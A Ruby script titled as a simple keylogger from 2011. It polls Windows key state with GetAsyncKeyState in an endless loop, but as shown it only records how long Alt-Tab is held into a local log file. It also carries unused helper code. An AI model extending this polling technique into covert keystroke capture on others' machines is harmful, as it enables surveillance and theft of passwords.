#!usr/bin/ruby
#Simple Keylogger in Ruby
#(C) Doddy Hackman 2011

require 'Win32API'
require 'date'
require './util'

def savefile(filename,text)
files = File.open(filename,'a')
files.puts text+"\n"
end

def capturar

	nave = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
    time = 0
	alttabpressed = false
	
	initOper = Time.now

	operInited = false
	
	while 1
				
		
		#alt = nave.call(0x12) & 0x01
		alt = nave.call(0x12)
		#tab = nave.call(0x09) & 0x01
		tab = nave.call(0x09)
		
		#puts alt & tab
		if (alt & tab != 0)
			if (alttabpressed == false)
				initOper = Time.now
			end
			alttabpressed = true
			operInited = true
			#puts "alt-tab"
			
		else 
			if (alt != 0 && alttabpressed)
				#puts "alt"
			else
				if (operInited)
					operInited = false
					timeSpent = Time.now - initOper
					Util.saveToFile("atlTab.log","#{DateTime.now},#{timeSpent}")
				end
				alttabpressed = false
			end
		end
		
		#sleep 0.5
		
		
	end
	
end

capturar() #Start the keylogger

# ¿ The End ?